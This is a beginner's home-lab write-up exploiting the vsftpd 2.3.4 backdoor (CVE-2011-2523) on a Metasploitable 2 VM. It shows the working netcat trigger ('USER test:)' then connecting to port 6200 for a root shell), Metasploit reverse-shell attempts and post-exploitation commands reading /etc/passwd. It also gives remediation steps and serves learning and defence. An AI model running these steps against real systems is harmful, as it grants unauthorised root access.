# CVE-2011-2523 — vsftpd 2.3.4 Backdoor Exploit
### Metasploitable 2 · Home Lab Practice · Manual Exploitation

---

## About This Writeup

**Author:** Kavinsuriya N G  
**Date:** May 10, 2026  
**Target:** Metasploitable 2 (Deliberately vulnerable VM)  
**Attacker:** Kali Linux  
**Environment:** VirtualBox — isolated Host-only network (safe & legal)  
**Skill Level:** Beginner — 2nd Year EEE Student  

> ⚠️ **Disclaimer:** This was performed in a controlled, isolated lab environment on a deliberately vulnerable machine (Metasploitable 2). Never attempt this on systems you do not own or have explicit written permission to test.

---

## Lab Setup

| Machine | OS | Role | IP Address |
|---|---|---|---|
| Kali Linux | Kali 2026.1 | Attacker | 192.168.56.1 |
| Metasploitable 2 | Ubuntu 8.04 | Victim | 192.168.56.101 |

**Network:** Both VMs on VirtualBox Host-only Adapter — completely isolated from the internet.

---

## Vulnerability Overview

| Field | Details |
|---|---|
| **CVE** | CVE-2011-2523 |
| **Software** | vsftpd 2.3.4 |
| **Type** | Backdoor (Supply Chain Attack) |
| **CVSS Score** | 10.0 (Critical) |
| **Discovered** | July 3, 2011 |
| **Port** | 21 (FTP trigger) → 6200 (backdoor shell) |
| **Access Level** | Root |

---

## The Story Behind CVE-2011-2523

In **June 2011**, the official vsftpd download server (hosted on SourceForge) was compromised. An attacker replaced the legitimate vsftpd 2.3.4 source code with a **backdoored version**.

The backdoor worked like this:

```c
// Simplified backdoor logic inside vsftpd 2.3.4
if (username contains ':' AND username contains ')') {
    bind_shell(port=6200);   // Open root shell — no password required
}
```

Any server that downloaded and installed vsftpd 2.3.4 from the official source during that window was infected. This is called a **Supply Chain Attack** — the software itself was weaponized before it even reached the victim.

**Discovery:** A security researcher noticed suspicious code in the source. The same day, vsftpd developer Chris Evans pulled the infected version and released a clean patch.

**Key takeaway:** Even "trusted" download sources can be compromised. Always verify checksums/hashes of downloaded software.

---

## Step 1 — Scanning (Nmap)

First step of any pentest: find what's running on the target.

### Command Used

```bash
nmap -sV 192.168.56.101
```

### Flag Breakdown

| Flag | Meaning |
|---|---|
| `nmap` | Network mapper — port scanner |
| `-sV` | Service Version detection — find exact software and version on each port |
| `192.168.56.101` | Target IP (Metasploitable 2) |

### Output

```
Starting Nmap 7.99 at 2026-05-10 00:44 -0400
Nmap scan report for 192.168.56.101
Host is up (0.0011s latency).

PORT     STATE  SERVICE    VERSION
21/tcp   open   ftp        vsftpd 2.3.4          ← VULNERABLE
22/tcp   open   ssh        OpenSSH 4.7p1
23/tcp   open   telnet     Linux telnetd
25/tcp   open   smtp       Postfix smtpd
53/tcp   open   domain     ISC BIND 9.4.2
80/tcp   open   http       Apache httpd 2.2.8
111/tcp  open   rpcbind    2 (RPC #100000)
139/tcp  open   netbios    Samba smbd 3.X-4.X
445/tcp  open   netbios    Samba smbd 3.X-4.X
1524/tcp open   bindshell  Metasploitable root shell
3306/tcp open   mysql      MySQL 5.0.51a
5432/tcp open   postgresql PostgreSQL 8.3.0-8.3.7
6667/tcp open   irc        UnrealIRCd
8180/tcp open   http       Apache Tomcat 1.1
```

### What This Revealed

Port 21 running **vsftpd 2.3.4** — this exact version has CVE-2011-2523. Without `-sV`, we would only see "port 21 open ftp" — not enough to find the vulnerability. **Version numbers unlock CVE research.**

---

## Step 2 — CVE Research

After seeing vsftpd 2.3.4 in the scan output:

**Google search:** `vsftpd 2.3.4 exploit`

**Found:** CVE-2011-2523 on:
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
- https://www.exploit-db.com/exploits/17491

**What we learned:**
- Username containing `:)` triggers the backdoor
- Backdoor opens a shell on **port 6200**
- Shell runs as **root** — highest privilege
- No password required

---

## Step 3 — Exploitation Attempt via Metasploit

### Launch Metasploit

```bash
msfconsole
```

Metasploit Framework loaded with 2,638 exploits available.

### Search for the Exploit

```bash
msf > search vsftpd
```

**Output:**

```
Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check
   -  ----                                  ---------------  ----       -----
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes
```

Module 1 — rank **excellent** — selected.

### Select the Module

```bash
msf > use 1
```

Output: `Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp`

### Set Target IP

```bash
msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.101
RHOSTS => 192.168.56.101
```

---

## Failures — Metasploit Errors (Important)

> These failures are the most valuable part of this writeup. Real security work always involves errors. Reading and debugging them is the actual skill.

---

### ❌ Failure 1 — LHOST Not Set

**Command run:**
```bash
run
```

**Error:**
```
[-] 192.168.56.101:21 - Msf::OptionValidateError One or more options failed to validate: LHOST.
```

**Why this happened:**  
The auto-selected payload `meterpreter_reverse_tcp` uses a **reverse connection** — meaning after exploitation, the target connects *back* to us. For this to work, Metasploit needs to know our (Kali) IP address — that's LHOST.

**Fix attempted:**
```bash
set LHOST 192.168.56.1
```

---

### ❌ Failure 2 — Port 8080 Already In Use

**Command run:**
```bash
run
```

**Error:**
```
[-] 192.168.56.101:21 - Exploit failed: RuntimeError bad-config:
    Fetch handler failed to start on 192.168.56.1:8080.
    The address is already in use or unavailable: (192.168.56.1:8080).
[*] Exploit completed, but no session was created.
```

**Why this happened:**  
The meterpreter_reverse_tcp payload uses an HTTP fetch handler on port 8080 to deliver the payload. Another process on Kali was already using port 8080, causing a conflict.

**Fix attempted:**
```bash
set LPORT 4444
run
```

**Result:** Same error — LPORT 4444 changed the listener port but the HTTP fetch handler still tried to use 8080 internally. The two settings were not linked.

---

### ❌ Failure 3 — Invalid Payload Name

**Command run:**
```bash
set payload cmd/unix/interact
```

**Error:**
```
[-] The value specified for payload is not valid.
```

**Why this happened:**  
Exact payload path was wrong. Metasploit requires precise payload strings — no partial matches.

**What was learned:**  
Use `show payloads` inside the module to list valid payload strings. Never guess payload names.

---

### Decision: Abandon Metasploit, Go Manual

After 3 consecutive failures, the decision was made to bypass Metasploit entirely and exploit the backdoor manually using only **Netcat** — based on direct understanding of how CVE-2011-2523 works.

> **Key insight:** Tool failure forces deeper understanding. If Metasploit had worked immediately, the mechanics of the backdoor would have remained abstract. The failures made the manual approach necessary — and more educational.

---

## Step 4 — Manual Exploitation via Netcat

### What is Netcat?

Netcat (`nc`) is a basic networking utility that reads and writes raw TCP/UDP connections. No parsing, no protocol handling — just raw bytes. It works on any port, making it perfect for manually interacting with services.

---

### Command 1 — Connect to FTP Port

```bash
nc -nv 192.168.56.101 21
```

**Flag breakdown:**

| Flag/Arg | Meaning |
|---|---|
| `nc` | Netcat — raw TCP connection tool |
| `-n` | No DNS resolution — use IP directly (faster, cleaner) |
| `-v` | Verbose — show connection status |
| `192.168.56.101` | Target IP |
| `21` | FTP port — vsftpd is running here |

**Output:**
```
(UNKNOWN) [192.168.56.101] 21 (ftp) open
220 (vsFTPd 2.3.4)
```

FTP server responded. Connection established.

---

### Command 2 — Trigger the Backdoor

```bash
USER test:)
```

**Why `test:)`:**  
The backdoor checks if the username contains both `:` and `)` characters. The word `test` is irrelevant — any string works. The smiley `:)` is the trigger.

- `abc:)` — works
- `hello:)` — works  
- `x:)` — works
- `test:)` — works ✓

**Output:**
```
331 Please specify the password.
```

This response means **the backdoor was triggered**. Port 6200 is now open on the target.

---

### Command 3 — Send Password to Complete Trigger

```bash
PASS test
```

**Why:** FTP protocol requires a PASS command after USER. The password value doesn't matter — the backdoor is already activated. This just completes the FTP handshake flow.

---

### Command 4 — Connect to Backdoor Shell (New Terminal)

Opened a **second terminal window** in Kali, then ran:

```bash
nc -nv 192.168.56.101 6200
```

**Why port 6200:**  
CVE-2011-2523 documentation specifies that the backdoor hardcodes port 6200 for the shell. The attacker who planted the backdoor chose an uncommon port to avoid detection by system administrators.

**Output:**
```
(UNKNOWN) [192.168.56.101] 6200 (?) open
```

Connected. Shell is live.

---

### Command 5 — Confirm Root Access

```bash
whoami
```

**Output:**
```
root
```

**Root access confirmed.** Full control of the Metasploitable machine achieved.

---

### Post-Exploitation Commands Run

After getting the root shell, the following commands were run to explore what root access means:

```bash
whoami          # Confirm user — output: root
id              # Full identity — uid=0(root) gid=0(root)
hostname        # Machine name
cat /etc/passwd # All users on the system
ls /root        # Contents of root's home directory
```

---

## Full Attack Flow Summary

```
[Kali - Terminal 1]                    [Metasploitable]
        |                                      |
nmap -sV 192.168.56.101  ──scan──►   Port 21: vsftpd 2.3.4
        |                                      |
Research CVE-2011-2523                         |
        |                                      |
nc -nv 192.168.56.101 21 ──connect──► FTP server responds
        |                                      |
USER test:)              ──trigger──► Backdoor activated
        |                                      Port 6200 opens
PASS test                ──complete──► Trigger confirmed
        |                                      |
[Kali - Terminal 2]                            |
        |                                      |
nc -nv 192.168.56.101 6200 ──connect──► Root shell
        |                                      |
whoami                   ◄──── root ───────────┘
```

---

## Tools Used

| Tool | Purpose |
|---|---|
| VirtualBox | Virtualization — run both VMs on one laptop |
| Kali Linux | Attacker OS |
| Metasploitable 2 | Deliberately vulnerable target |
| Nmap | Port and service version scanning |
| Metasploit Framework | Exploit framework (attempted — failed) |
| Netcat (nc) | Manual raw TCP connection — used for final exploit |

---

## Key Learnings

**1. Version numbers are everything**  
`nmap -sV` reveals exact software versions. Without `-sV`, port 21 shows as "ftp open" — useless. With it: "vsftpd 2.3.4" — directly searchable on CVE databases.

**2. Tool failure is a learning opportunity**  
Metasploit failing 3 times forced a deeper understanding of how the backdoor actually works. The manual netcat exploit required reading the CVE and understanding the exact trigger mechanism — far more valuable than a one-click Metasploit run.

**3. Supply chain attacks are devastating**  
This vulnerability wasn't in vsftpd's code — it was injected into the official download. The software appeared legitimate. This is why software verification (checksums, signatures) matters.

**4. Netcat is a fundamental skill**  
No frameworks needed. Understanding the raw protocol + netcat = direct exploitation. This skill transfers to every other service — HTTP, SMTP, IRC, custom protocols.

**5. Unpatched systems are trivially exploitable**  
CVE-2011-2523 is from 2011. This exploit still works in 2026 on unpatched systems. Patch management is not optional.

---

## Remediation (How to Fix This)

1. **Upgrade vsftpd** to a patched version (2.3.5+)
2. **Verify software checksums** before installation — never trust downloads blindly
3. **Restrict FTP access** — firewall rules, IP whitelisting
4. **Disable FTP entirely** if not needed — use SFTP instead
5. **Monitor port 6200** — any activity on this port is a sign of compromise
6. **Network segmentation** — FTP servers should not be directly accessible from untrusted networks

---

## References

- [CVE-2011-2523 — MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523)
- [Exploit-DB — vsftpd 2.3.4 Backdoor](https://www.exploit-db.com/exploits/17491)
- [Metasploitable 2 — Rapid7](https://docs.rapid7.com/metasploit/metasploitable-2/)
- [Nmap Documentation](https://nmap.org/book/man.html)

---


*This writeup is part of my home lab practice series. All testing done in isolated, legal environments.*

---

*Home Lab Series — Metasploitable 2 Practice*  
*Next: Samba, MySQL, UnrealIRCd exploits*
